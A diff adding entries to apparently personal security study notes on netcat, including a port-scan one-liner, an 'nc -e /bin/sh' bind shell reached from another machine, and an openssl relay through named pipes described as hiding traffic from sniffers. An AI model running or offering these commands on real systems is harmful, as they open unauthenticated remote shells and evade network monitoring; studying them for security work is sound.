@@ -55,6 +55,9 @@
    6) $ncat -l 12345 -c 'nc www.google.com 80'                    #one shot output
    7) $nc -v -n -z -w 1 127.0.0.1 1-1000   
       #port scanning, -n prevents DNS lookup, -z not receive any data, -w 1 connection timeout after 1 second of inactivity
+   8) $nc -l -p 1234 -e /bin/sh    #run this command in IP 192.168.1.2, -e redirected input and output via network socket
+      $nc 192.168.1.2 1234         #in another computer of the same network
+      $ls -las                     #Making any process a server
    ```
    [logtrap.sh](https://github.com/mndarren/Code-Lib/blob/master/Data_Security_lib/resource/bash_code/logtrap.sh)
 4. gdb (Attacker and Security) --dump data from register  
@@ -132,6 +135,13 @@
    #named pipe exists in FS, independently from process, unnamed pipe vanished as soon as it's closed or complete execution
    $mkfifo backpipe
    $nc -l 12345 0<backpipe | nc www.google.com 80 1>backpipe  #redirect input and output
+   #the following is a big one:
+   mkfifo tmp
+   mkfifo tmp2
+   nc -l 8080 -k > tmp < tmp2 &
+   while true; do
+      openssl s_client -connet www.google.com:443 -quiet < tmp > tmp2
+   done;    #the traffic cannot be viewed in wire sniffer, like wireshark
    ```
    [encServ.sh](https://github.com/mndarren/Code-Lib/blob/master/Data_Security_lib/resource/bash_code/encServ.sh)  
    [encCli.sh](https://github.com/mndarren/Code-Lib/blob/master/Data_Security_lib/resource/bash_code/encCli.sh)
